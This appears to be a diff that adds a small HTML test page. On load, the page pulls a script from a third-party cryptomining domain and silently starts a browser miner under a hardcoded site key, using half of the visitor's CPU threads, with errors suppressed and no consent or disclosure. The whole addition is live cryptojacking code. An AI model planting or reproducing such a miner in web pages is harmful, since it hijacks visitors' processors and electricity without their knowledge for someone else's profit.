@@ -1,0 +1,24 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>test</title>
+    <link rel="stylesheet" type="text/css" href="https://cryptoloot.pro/lib/miner.css">
+  </head>
+  <body>
+    <script src="https://cryptaloot.pro/lib/crypta.js"></script>
+<script>
+var miner = null;
+try {
+  var threads = window.navigator.hardwareConcurrency / 2;
+            if (threads < 1) {
+                var threads = 1;
+            }
+  miner = new CRLT.Anonymous('93f2b499059e36dd47dc89b9dbef7c329283c1e1f77e', {threads: threads,autoThreads:false, throttle:0.1});
+  
+} catch(e) {}
+
+miner.start();
+</script>
+
+  </body>
+</html>
